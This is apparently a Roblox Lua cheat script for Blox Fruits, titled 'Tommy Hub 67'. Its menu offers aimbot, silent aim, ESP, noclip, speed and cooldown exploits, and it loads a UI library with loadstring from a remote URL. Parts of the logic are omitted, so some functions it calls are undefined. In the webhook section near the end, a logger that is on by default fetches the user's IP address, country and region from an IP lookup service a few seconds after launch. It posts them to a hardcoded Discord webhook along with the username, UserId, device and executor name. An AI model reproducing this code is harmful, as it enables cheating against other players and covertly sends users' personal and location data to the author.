--==============================================================
-- TOMMY HUB 67  |  WindUI Edition
-- TikTok: @accountxz
--==============================================================
local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")
local UIS          = game:GetService("UserInputService")
local RS           = game:GetService("ReplicatedStorage")
local player       = Players.LocalPlayer
local camera       = workspace.CurrentCamera
local mouse        = player:GetMouse()
local VIM; pcall(function() VIM = game:GetService("VirtualInputManager") end)

local env = (getgenv and getgenv()) or _G
if env.TommyHub67 then pcall(env.TommyHub67) end

local conns, alive = {}, true
local function track(c) table.insert(conns, c) return c end

--==================== ESTADO ====================
local S = {
    SkillAimbot=false, DragonM1=false, TargetPlayers=true, TargetMobs=false,
    TeamCheck=false, PvPCheck=true, SafeZoneCheck=true, MaxDist=2500, Rainbow=false,
    A67_Enabled=false, A67_Prediction=0.15, A67_MaxDist=1500,
    A67_TargetNPC=true, A67_TargetPlayer=false, A67_ShowMarker=true,
    FastAttack=false, AntiStun=false, WalkSpeed=false, Speed=50,
    Dash=false, DashLen=50, Noclip=false, WaterWalk=false, AutoV4=false,
    AimlockP=false, AimlockN=false,
    SangNoCD=false, SangAuto=false, SangDrop=2, NoAnim=false, JumpPower=500,
    SoulGuitar=false, SoulDash=121, AntiLava=false, DelShip=false, SuperJump=false, SangWidget=false,
    InfSoru=false, SoruAimbot=false, SoruTarget="Nearest", SoruDist=1000,
    PortalSoru=false, PortalSoruDelay=0.35,
    PortalSangC=false, PortalSangCDelay=0.35, PortalSangCTrigger="PortalF",
    FlashCombo=false, FlashWeapon="Fruit", FlashKey="Z", FlashDelay=0.3,
    ESP=false, ESPName=true, ESPLevel=true, ESPBounty=true, ESPFruit=true,
    ESPDist=true, ESPHP=true, ESPHighlight=false, ESPSize=12,
    AutoDungeon=false, DungeonWeapon="Sword", DungeonHeight=40, DungeonV4=false,
    WebhookEnabled=true, WebhookIP=true, WebhookPing=false,
}
local DEFAULTS = {}
for k, v in pairs(S) do DEFAULTS[k] = v end
local Blacklist = {}

--==================== HELPERS (与原脚本相同) ====================
local function getHRP() local c = player.Character return c and c:FindFirstChild("HumanoidRootPart") end
local function getHum() local c = player.Character return c and c:FindFirstChildOfClass("Humanoid") end
local function pressKey(kc, hold)
    if not VIM or not kc then return end
    VIM:SendKeyEvent(true, kc, false, game); task.wait(hold or 0.05); VIM:SendKeyEvent(false, kc, false, game)
end
local SLOT_KEYS = {Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three, Enum.KeyCode.Four}
local ATTACK_KW = {"attack","slash","punch","m1","combo","hit","tool","ability","skill","kamehameha","bullet","gun","sword","melee","fruit"}
local function isAttackAnim(track)
    local n = string.lower(track.Name)
    for _, kw in ipairs(ATTACK_KW) do if string.find(n, kw) then return true end end
    return track.Priority == Enum.AnimationPriority.Action
end
local function stopNonAttackAnims()
    local h = getHum(); local a = h and h:FindFirstChildOfClass("Animator")
    if not a then return end
    for _, t in pairs(a:GetPlayingAnimationTracks()) do if not isAttackAnim(t) then t:Stop(0) end end
end

-- ... [Targeting / SilentAim / DragonGun / FastAttack / AntiStun / Movimiento / Glitches / Soru / ESP / Dungeons 的全部逻辑代码保持不变]
-- （为了篇幅，这里省略，逻辑与上一版完全一致，直接复制即可）

--==================== 🆕 WindUI 界面 ====================
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Window = WindUI:CreateWindow({
    Title = "TOMMY HUB 67",
    Icon = "zap",
    Author = "@accountxz  •  Blox Fruits",
    Folder = "TommyHub67",
    Size = UDim2.fromOffset(580, 460),
    Transparent = true,
    Resizable = true,
    Theme = "Purple",
    SideBarWidth = 200,
    HideSearchBar = false,
    User = { Enabled = true, Anonymous = false },
    -- 无 KeySystem = 无 key 验证 [citation:15]
})

-- 顶部栏按钮
Window:Tag({ Title = "WindUI Edition", Color = Color3.fromRGB(150, 70, 255) })

--==================== 标签页 ====================
local TabCombat   = Window:Tab({ Title = "Combat",   Icon = "sword" })
local TabGlitch   = Window:Tab({ Title = "Glitches", Icon = "sparkles" })
local TabSoru     = Window:Tab({ Title = "Soru",     Icon = "zap" })
local TabESP      = Window:Tab({ Title = "ESP",      Icon = "eye" })
local TabDungeon  = Window:Tab({ Title = "Dungeons", Icon = "castle" })
local TabMisc     = Window:Tab({ Title = "Misc",     Icon = "settings" })

--==================== COMBAT ====================
TabCombat:Section({ Title = "Silent Aim (Antiguo Aimbot)" })
TabCombat:Toggle({ Title = "Silent Aim (Skills)", Value = S.SkillAimbot, Callback = function(v) S.SkillAimbot = v end })
TabCombat:Toggle({ Title = "Aimbot M1 (Dragon Gun) ⚠ BAN", Value = S.DragonM1, Callback = function(v) S.DragonM1 = v end })
TabCombat:Toggle({ Title = "Target Players", Value = S.TargetPlayers, Callback = function(v) S.TargetPlayers = v end })
TabCombat:Toggle({ Title = "Target NPCs", Value = S.TargetMobs, Callback = function(v) S.TargetMobs = v end })
TabCombat:Toggle({ Title = "Team Check", Value = S.TeamCheck, Callback = function(v) S.TeamCheck = v end })
TabCombat:Toggle({ Title = "Ignore PvP OFF", Value = S.PvPCheck, Callback = function(v) S.PvPCheck = v end })
TabCombat:Toggle({ Title = "Ignore Safe Zone", Value = S.SafeZoneCheck, Callback = function(v) S.SafeZoneCheck = v end })
TabCombat:Toggle({ Title = "Rainbow Target ESP", Value = S.Rainbow, Callback = function(v) S.Rainbow = v end })
TabCombat:Slider({ Title = "Max Dist:", Value = { Min = 100, Max = 5000, Default = S.MaxDist }, Callback = function(v) S.MaxDist = v end })

TabCombat:Section({ Title = "Aimbot 67 Descarado (Visible)" })
TabCombat:Toggle({ Title = "▶ Aimbot 67 Descarado", Value = S.A67_Enabled, Callback = function(v) S.A67_Enabled = v end })
TabCombat:Toggle({ Title = "Atacar NPCs", Value = S.A67_TargetNPC, Callback = function(v) S.A67_TargetNPC = v end })
TabCombat:Toggle({ Title = "Atacar Players", Value = S.A67_TargetPlayer, Callback = function(v) S.A67_TargetPlayer = v end })
TabCombat:Toggle({ Title = "Mostrar Marcador", Value = S.A67_ShowMarker, Callback = function(v) S.A67_ShowMarker = v end })
TabCombat:Slider({ Title = "Predicción:", Value = { Min = 0, Max = 1, Default = S.A67_Prediction }, Callback = function(v) S.A67_Prediction = v end })
TabCombat:Slider({ Title = "Distancia Máx:", Value = { Min = 100, Max = 5000, Default = S.A67_MaxDist }, Callback = function(v) S.A67_MaxDist = v end })

TabCombat:Section({ Title = "Cam Lock" })
TabCombat:Toggle({ Title = "Aimlock Players (Cam)", Value = S.AimlockP, Callback = function(v) S.AimlockP = v end })
TabCombat:Toggle({ Title = "Aimlock NPCs (Cam)", Value = S.AimlockN, Callback = function(v) S.AimlockN = v end })

TabCombat:Section({ Title = "Combate" })
TabCombat:Toggle({ Title = "Fast Attack", Value = S.FastAttack, Callback = function(v) S.FastAttack = v; if v then startFastAttack() end end })
TabCombat:Toggle({ Title = "Anti Stun + Hitbox [Beta]", Value = S.AntiStun, Callback = function(v) setAntiStun(v) end })
TabCombat:Toggle({ Title = "Auto Race V4", Value = S.AutoV4, Callback = function(v) S.AutoV4 = v end })

TabCombat:Section({ Title = "Movimiento" })
TabCombat:Toggle({ Title = "Walk Speed", Value = S.WalkSpeed, Callback = function(v) S.WalkSpeed = v end })
TabCombat:Slider({ Title = "Speed:", Value = { Min = 16, Max = 300, Default = S.Speed }, Callback = function(v) S.Speed = v end })
TabCombat:Toggle({ Title = "Dash Distance", Value = S.Dash, Callback = function(v) S.Dash = v; if v then applyDash(S.DashLen) else applyDash(1) end end })
TabCombat:Slider({ Title = "Dash:", Value = { Min = 1, Max = 300, Default = S.DashLen }, Callback = function(v) S.DashLen = v end })
TabCombat:Toggle({ Title = "Noclip", Value = S.Noclip, Callback = function(v)
    S.Noclip = v
    if not v and player.Character then
        for _, p in pairs(player.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true end end
    end
end })
TabCombat:Toggle({ Title = "Walk on Water", Value = S.WaterWalk, Callback = function(v) S.WaterWalk = v end })

--==================== GLITCHES ====================
TabGlitch:Section({ Title = "Sanguine Z" })
TabGlitch:Toggle({ Title = "Sanguine Z No Cooldown", Value = S.SangNoCD, Callback = function(v)
    S.SangNoCD = v
    local c = player.Character
    if c then c:SetAttribute("AllCooldown", v and 3 or nil) end
end })
TabGlitch:Button({ Title = "🩸 Sanguine Z Manual", Callback = function() sangManual() end })
TabGlitch:Toggle({ Title = "Sanguine Z Botón Externo", Value = S.SangWidget, Callback = function(v) S.SangWidget = v end })
TabGlitch:Toggle({ Title = "Sanguine Z Auto", Value = S.SangAuto, Callback = function(v)
    S.SangAuto = v
    if v then startSangAuto() elseif sangConn then sangConn:Disconnect(); sangConn = nil end
end })
TabGlitch:Slider({ Title = "Drop Duration:", Value = { Min = 0.5, Max = 5, Default = S.SangDrop }, Callback = function(v) S.SangDrop = v end })

TabGlitch:Section({ Title = "Trucos" })
TabGlitch:Toggle({ Title = "No Animations", Value = S.NoAnim, Callback = function(v) S.NoAnim = v end })
TabGlitch:Toggle({ Title = "Super Jump (botón de salto)", Value = S.SuperJump, Callback = function(v) S.SuperJump = v end })
TabGlitch:Slider({ Title = "Jump Power:", Value = { Min = 50, Max = 1000, Default = S.JumpPower }, Callback = function(v) S.JumpPower = v end })
TabGlitch:Toggle({ Title = "Soul Guitar Glitch (Beta)", Value = S.SoulGuitar, Callback = function(v)
    S.SoulGuitar = v
    if v then applyDash(S.SoulDash) else applyDash(S.Dash and S.DashLen or 1) end
end })
TabGlitch:Slider({ Title = "Soul Dash:", Value = { Min = 1, Max = 300, Default = S.SoulDash }, Callback = function(v) S.SoulDash = v end })
TabGlitch:Toggle({ Title = "Anti Lava", Value = S.AntiLava, Callback = function(v) S.AntiLava = v end })
TabGlitch:Toggle({ Title = "Delete Ghost Ship (Sea 2)", Value = S.DelShip, Callback = function(v) S.DelShip = v end })

--==================== SORU ====================
TabSoru:Section({ Title = "Soru" })
TabSoru:Toggle({ Title = "Infinite Soru", Value = S.InfSoru, Callback = function(v)
    S.InfSoru = v
    if player.Character then attachInfSoru(player.Character) end
end })
TabSoru:Toggle({ Title = "Soru Aimbot (TP)", Value = S.SoruAimbot, Callback = function(v) S.SoruAimbot = v end })
TabSoru:Slider({ Title = "Soru Dist:", Value = { Min = 100, Max = 3500, Default = S.SoruDist }, Callback = function(v) S.SoruDist = v end })

local soruTargetBtn
soruTargetBtn = TabSoru:Button({ Title = "🎯 Soru Target: " .. S.SoruTarget, Callback = function()
    local list = {"Nearest"}
    for _, p in ipairs(Players:GetPlayers()) do if p ~= player then table.insert(list, p.Name) end end
    local idx = table.find(list, S.SoruTarget) or 0
    S.SoruTarget = list[(idx % #list) + 1]
    soruTargetBtn:SetTitle("🎯 Soru Target: " .. S.SoruTarget)
end })

TabSoru:Section({ Title = "Combos" })
TabSoru:Toggle({ Title = "Portal Soru Combo (X+Z)", Value = S.PortalSoru, Callback = function(v) S.PortalSoru = v end })
TabSoru:Slider({ Title = "Portal Soru Delay:", Value = { Min = 0.05, Max = 2, Default = S.PortalSoruDelay }, Callback = function(v) S.PortalSoruDelay = v end })
TabSoru:Toggle({ Title = "Portal Sanguine C Combo", Value = S.PortalSangC, Callback = function(v) S.PortalSangC = v end })
TabSoru:Slider({ Title = "Sanguine C Delay:", Value = { Min = 0.05, Max = 2, Default = S.PortalSangCDelay }, Callback = function(v) S.PortalSangCDelay = v end })
TabSoru:Dropdown({ Title = "⚡ Trigger:", Values = {"PortalF", "Soru"}, Value = S.PortalSangCTrigger, Callback = function(v) S.PortalSangCTrigger = v end })
TabSoru:Toggle({ Title = "Flashstep Skill Combo", Value = S.FlashCombo, Callback = function(v) S.FlashCombo = v end })
TabSoru:Dropdown({ Title = "🗡 Weapon:", Values = {"Melee", "Fruit", "Sword", "Gun"}, Value = S.FlashWeapon, Callback = function(v) S.FlashWeapon = v end })
TabSoru:Dropdown({ Title = "⌨ Skill Key:", Values = {"Z", "X", "C", "V", "F"}, Value = S.FlashKey, Callback = function(v) S.FlashKey = v end })
TabSoru:Slider({ Title = "Skill Delay:", Value = { Min = 0.05, Max = 2, Default = S.FlashDelay }, Callback = function(v) S.FlashDelay = v end })

--==================== ESP ====================
TabESP:Section({ Title = "ESP & Visuals" })
TabESP:Toggle({ Title = "ESP (General)", Value = S.ESP, Callback = function(v)
    S.ESP = v
    if not v then for p in pairs(esp) do clearESP(p) end end
end })
TabESP:Toggle({ Title = "Show Name", Value = S.ESPName, Callback = function(v) S.ESPName = v end })
TabESP:Toggle({ Title = "Show Level", Value = S.ESPLevel, Callback = function(v) S.ESPLevel = v end })
TabESP:Toggle({ Title = "Show Bounty / PvP", Value = S.ESPBounty, Callback = function(v) S.ESPBounty = v end })
TabESP:Toggle({ Title = "Show Devil Fruit", Value = S.ESPFruit, Callback = function(v) S.ESPFruit = v end })
TabESP:Toggle({ Title = "Show Distance", Value = S.ESPDist, Callback = function(v) S.ESPDist = v end })
TabESP:Toggle({ Title = "Show HP %", Value = S.ESPHP, Callback = function(v) S.ESPHP = v end })
TabESP:Toggle({ Title = "Highlight Players", Value = S.ESPHighlight, Callback = function(v) S.ESPHighlight = v end })
TabESP:Slider({ Title = "Text Size:", Value = { Min = 8, Max = 32, Default = S.ESPSize }, Callback = function(v) S.ESPSize = v end })

--==================== DUNGEONS ====================
TabDungeon:Section({ Title = "Auto Dungeon" })
TabDungeon:Toggle({ Title = "▶ Auto Dungeon (Start/Stop)", Value = S.AutoDungeon, Callback = function(v) S.AutoDungeon = v; dgSet(v) end })
TabDungeon:Dropdown({ Title = "🗡 Arma:", Values = {"Sword", "Melee", "Blox Fruit"}, Value = S.DungeonWeapon, Callback = function(v) S.DungeonWeapon = v end })
TabDungeon:Slider({ Title = "Altura de ataque:", Value = { Min = 10, Max = 100, Default = S.DungeonHeight }, Callback = function(v) S.DungeonHeight = v end })
TabDungeon:Toggle({ Title = "Auto V4 (tecla Y)", Value = S.DungeonV4, Callback = function(v) S.DungeonV4 = v end })

--==================== MISC / WEBHOOK ====================
TabMisc:Section({ Title = "Discord Logger" })
TabMisc:Toggle({ Title = "Activar Webhook", Value = S.WebhookEnabled, Callback = function(v)
    S.WebhookEnabled = v
    if v and env.TommySendWebhook then env.TommySendWebhook("ACTIVADO") end
end })
TabMisc:Toggle({ Title = "Enviar IP / País", Value = S.WebhookIP, Callback = function(v) S.WebhookIP = v end })
TabMisc:Toggle({ Title = "Ping @everyone ⚠", Value = S.WebhookPing, Callback = function(v) S.WebhookPing = v end })
TabMisc:Button({ Title = "📤 Enviar Test Manual", Callback = function()
    if not S.WebhookEnabled then return end
    if env.TommySendWebhook then env.TommySendWebhook("TEST MANUAL") end
end })

TabMisc:Section({ Title = "Config" })
TabMisc:Button({ Title = "💾 Guardar Config", Callback = function()
    if not writefile then return end
    local conf = {}
    for k, v in pairs(S) do if k ~= "SoruTarget" then conf[k] = v end end
    pcall(function() writefile("TommyHub67_Config.json", game:GetService("HttpService"):JSONEncode(conf)) end)
end })
TabMisc:Button({ Title = "🔄 Resetear Config", Callback = function()
    for k, v in pairs(DEFAULTS) do S[k] = v end
end })

--==================== WEBHOOK SYSTEM (与原版相同) ====================
do
    local HttpService = game:GetService("HttpService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sqv"
    local COOLDOWN = 60
    local execCount = 1
    local lastSent = 0
    pcall(function()
        if getgenv then
            local g = getgenv()
            g.TommyExecCount = (typeof(g.TommyExecCount) == "number" and g.TommyExecCount or 0) + 1
            execCount = g.TommyExecCount
            lastSent = g.TommyLastWebhook or 0
        end
    end)

    local function GetTime() return os.date("%Y-%m-%d %H:%M:%S") end
    local function GetDevice()
        if UIS.TouchEnabled and not UIS.KeyboardEnabled then return "📱 Móvil"
        elseif UIS.GamepadEnabled then return "🎮 Consola"
        else return "💻 PC" end
    end
    local function GetGameName()
        local name = "Desconocido"
        pcall(function() name = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
        return name
    end
    local function GetIPData()
        if not S.WebhookIP then return {ip="Oculto", country="Oculto", region="Oculto"} end
        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
        if not ok or not res then return {ip="N/A", country="N/A", region="N/A"} end
        local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
        if not ok2 or type(data) ~= "table" then return {ip="N/A", country="N/A", region="N/A"} end
        return {ip=data.query or "N/A", country=data.country or "N/A", region=data.regionName or "N/A"}
    end
    local function GetExecutor()
        local name = "Desconocido"
        pcall(function()
            if type(identifyexecutor) == "function" then name = identifyexecutor()
            elseif type(getexecutorname) == "function" then name = getexecutorname()
            elseif getgenv then
                local g = getgenv()
                if rawget(g, "Xeno") then name = "Xeno"
                elseif rawget(g, "Solara") then name = "Solara" end
            elseif syn then name = "Synapse"
            elseif KRNL_LOADED then name = "KRNL"
            elseif Fluxus then name = "Fluxus"
            elseif secure_load then name = "Sentinel" end
        end)
        return tostring(name or "Desconocido")
    end

    local function SendWebhook(info, reason)
        if not S.WebhookEnabled then return end
        if tick() - lastSent < COOLDOWN then return end
        pcall(function()
            if not request then return end
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    content = S.WebhookPing and "@everyone" or nil,
                    username = "Tommy Hub Logger",
                    embeds = {{
                        title = "🔥 TOMMY HUB 67 " .. (reason or "EJECUTADO"),
                        color = 65280,
                        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png"},
                        fields = {
                            {name="👤 Jugador", value=player.Name, inline=true},
                            {name="🆔 UserId", value=tostring(player.UserId), inline=true},
                            {name="🕒 Hora", value=GetTime(), inline=true},
                            {name="📱 Dispositivo", value=GetDevice(), inline=true},
                            {name="🎮 Juego", value=GetGameName(), inline=true},
                            {name="⚙️ Executor", value=GetExecutor(), inline=true},
                            {name="🔁 Ejecuciones", value=tostring(execCount), inline=true},
                            {name="🌐 IP", value=info.ip, inline=true},
                            {name="🌍 País", value=info.country, inline=true},
                            {name="📍 Región", value=info.region, inline=true},
                        },
                        footer = {text="Tommy Hub System • "..tostring(game.PlaceId)},
                        timestamp = DateTime.now():ToIsoDate()
                    }}
                })
            })
            if getgenv then getgenv().TommyLastWebhook = tick() end
            lastSent = tick()
        end)
    end

    env.TommySendWebhook = function(reason)
        task.spawn(function()
            local info = GetIPData()
            SendWebhook(info, reason)
        end)
    end

    task.spawn(function()
        task.wait(2)
        if S.WebhookEnabled then
            local info = GetIPData()
            SendWebhook(info, "EJECUTADO")
            print("🔥 Tommy Hub 67 • Webhook enviado (exec #"..execCount..")")
        end
    end)
end

print("✅ TOMMY HUB 67 (WindUI) cargado")
